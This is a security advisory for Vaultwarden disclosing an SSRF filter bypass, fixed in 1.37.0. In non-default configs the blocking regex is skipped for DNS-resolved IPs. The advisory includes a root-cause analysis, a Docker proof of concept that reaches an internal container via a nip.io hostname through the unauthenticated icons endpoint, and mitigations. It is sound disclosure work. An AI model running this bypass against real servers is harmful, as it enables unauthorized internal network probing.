repo.description:
### Summary
The internal-IP SSRF filter can be bypassed in specific non-default configuration. 

When an operator disables non-global-IP block (`HTTP_REQUEST_BLOCK_NON_GLOBAL_IPS=false`) and instead relies on `HTTP_REQUEST_BLOCK_REGEX` to keep the server's outbound HTTP client (icon fetching, etc.) away from internal ranges, the regex is **never applied to resolved IP addresses**. An unauthenticated attacker can therefore reach a regex-blocked internal IP by supplying a hostname that resolves to that IP but does not textually match the regex,via unauthenticated `/icons/<host>/icon.png` endpoint.

Default installs are **not** affected.

This is a residual gap in the same fixes implemented for CVE-2026-47160 / GHSA-72vh-x5jq-m82g (fixed in 1.36.0). That fix closed decimal/hex/octal IP-format bypass which affected the _default_ config. This report is a distinct gap, the regex is not applied post-resolution, that affects _regex-reliance_ config and is present in 1.36.0 and earlier. It is fixed in 1.37.0.

### Details
The pre-connect and post-resolution filters are asymmetric.

`should_block_host()` (src/http_client.rs:135) applies **both** checks to an IP
host - `should_block_ip()` and `should_block_address_regex()`. But
`post_resolve()` (src/http_client.rs:273) applies **only** `should_block_ip()`:

    // src/http_client.rs:273 @ tag 1.36.0
    fn post_resolve(name: &str, ip: IpAddr) -> Result<(), CustomHttpClientError> {
        if should_block_ip(ip) {
            Err(CustomHttpClientError::NonGlobalIp { domain: Some(name.to_string()), ip })
        } else {
            Ok(())
        }
    }

`should_block_ip()` (src/http_client.rs:61) short-circuits to `false` for every
IP when the non-global-IP block is disabled:

    fn should_block_ip(ip: IpAddr) -> bool {
        if !CONFIG.http_request_block_non_global_ips() {   // default: true
            return false;
        }
        !is_global(ip)
    }

So with `http_request_block_non_global_ips=false`, the regex
(`http_request_block_regex`, src/config.rs:703) is the *only* protection for
internal ranges - yet `resolve_domain()` (src/http_client.rs:241) only runs it
against the domain string in `pre_resolve()` (src/http_client.rs:257), never
against the resolved IP in `post_resolve()`.

For a URL whose host is a domain name, the flow is:

  1. pre_resolve() -> should_block_host(Host::Domain(name)) -> regex tested
     against the **domain string** only. A hostname that does not textually
     contain the target IP does not match an IP-pattern regex -> pass.
  2. DNS resolves the name to an internal IP.
  3. post_resolve(name, ip) -> should_block_ip(ip) -> false (flag disabled)
     -> regex is never applied to the IP -> allowed.

The request then proceeds to the internal IP. In contrast, the same IP supplied
as a literal is caught, because should_block_host() (used for IP-literal hosts
at src/api/icons.rs:123) does apply the regex.

Entry point: `icon_internal` (src/api/icons.rs:111, `#[get("/<host>/icon.png")]`)
is unauthenticated and drives this outbound fetch through the shared reqwest
client + custom DNS resolver. Other outbound requests that use the shared
resolver (push relay, HIBP, Duo, version check) were also affected, but their
destinations are fixed or administrator-configured, so the attacker-reachable
entry point is the unauthenticated icon endpoint.

Affected source (line numbers per tag 1.36.0, src/http_client.rs unless noted):
  - post_resolve            :273   (root cause - only should_block_ip)
  - should_block_ip         :61    (flag short-circuit)
  - should_block_address_regex :69
  - should_block_host       :135   (correct: both checks)
  - resolve_domain          :241   (pre_resolve + per-IP post_resolve)
  - pre_resolve             :257   (regex on domain string only)
  - icon_internal route     :111   (src/api/icons.rs, unauthenticated)

Suggested fix (applied in 1.37.0): route the resolved IP through should_block_host() in
post_resolve() so the regex applies to resolved IPs the same way it does to
literals - e.g. build a Host from `ip` and call should_block_host(&host),
preserving the informative NonGlobalIp{domain} error. One localized change,
no config or contract changes.

### PoC
Tested against `vaultwarden/server:1.36.0` with Docker. `nip.io` is
used purely as an attacker-controlled DNS name that resolves to an arbitrary IP;
any DNS record the attacker controls works. No authentication is required.

1. Start an "internal" target the Vaultwarden host can reach (here, a second
   container on the default bridge, e.g. 172.17.0.3):

   docker run -d --name marker -w /web python:3-alpine \
     sh -c 'echo "<link rel=icon href=/favicon.ico>" > index.html; \
            printf "\211PNG\r\n..." > favicon.ico; python3 -m http.server 80'
   IP=$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' marker)

2. Start Vaultwarden in the vulnerable config - global-IP block OFF, relying on
   a regex to keep the internal /16 out:

   docker run -d --name vw -p 127.0.0.1:8000:80 \
     -e I_REALLY_WANT_VOLATILE_STORAGE=true \
     -e HTTP_REQUEST_BLOCK_NON_GLOBAL_IPS=false \
     -e HTTP_REQUEST_BLOCK_REGEX='^172\.17\.' \
     -e ICON_SERVICE=internal -e WEB_VAULT_ENABLED=false -e LOG_LEVEL=debug \
     vaultwarden/server:1.36.0

3. Literal IP - correctly BLOCKED by the regex:

   curl -s -o /dev/null "http://127.0.0.1:8000/icons/$IP/icon.png"
   docker logs vw 2>&1 | grep -i 'blocked address'
   \#  -> WARN Blocked address: 172.17.0.3

4. Hostname that resolves to the SAME IP - BYPASS, request reaches the internal
   target:

   HOST=$(echo "$IP" | tr . -).nip.io       \# 172-17-0-3.nip.io -> 172.17.0.3
   curl -s -o /dev/null "http://127.0.0.1:8000/icons/$HOST/icon.png"
   docker logs vw 2>&1 | grep -iE "connected to $IP|Downloaded icon"
   \#  -> connected to 172.17.0.3:80 ; Downloaded icon from http://172-17-0-3.nip.io/favicon.ico
   docker logs marker 2>&1 | grep GET
   \#  -> "GET / HTTP/1.1" 200  and  "GET /favicon.ico HTTP/1.1" 200   (SSRF landed)

5. Control - the SAME hostname under the DEFAULT config
   (HTTP_REQUEST_BLOCK_NON_GLOBAL_IPS=true) is blocked (no marker hit),
   confirming the defect is specifically the missing regex in post_resolve()
   and that default installs are safe.

The fetched favicon bytes are returned to the caller, so this is a non-blind
SSRF (internal service/port discovery plus retrieval of image-renderable
content), not merely a timing oracle.

### Impact
Who is impacted: only installs configured with
`HTTP_REQUEST_BLOCK_NON_GLOBAL_IPS=false` AND a `HTTP_REQUEST_BLOCK_REGEX`
(or the deprecated `ICON_BLACKLIST_REGEX`) intended to restrict internal
ranges. Default installs are unaffected.

For an affected install, the issue is unauthenticated and remotely triggerable
(the `/icons/<host>/icon.png` endpoint needs no login) and requires only that
the attacker control a DNS name resolving to the target internal IP - a low
bar. Because Vaultwarden is commonly self-hosted alongside other internal
services (NAS, router admin UIs, other containers, adjacent APIs), an attacker
can perform internal network/port discovery and retrieve image-renderable
content from those hosts. The favicon bytes are returned, so it is not blind.

Bounds: the request is GET-only, follows redirects that are themselves
re-checked by should_block_host(), and only image-parseable responses are
returned as an icon - so it is not an arbitrary internal-URL read primitive
(e.g. cloud-metadata JSON is fetched but not returned as an image). This, plus
the non-default-config precondition, is why we assess this as lower severity
than CVE-2026-47160.

Affected versions: 1.36.0 and earlier. Fixed in 1.37.0.

### Patches
Fixed in 1.37.0: `post_resolve()` now routes each resolved IP through
`should_block_host()`, so `HTTP_REQUEST_BLOCK_REGEX` is applied to resolved
addresses as well as IP literals. Upgrade to 1.37.0 or later. As a workaround
on older versions, keep `HTTP_REQUEST_BLOCK_NON_GLOBAL_IPS=true` (the default)
or disable internal icon downloading.
repo.summary: SSRF filter bypass (regex not applied post-resolution)
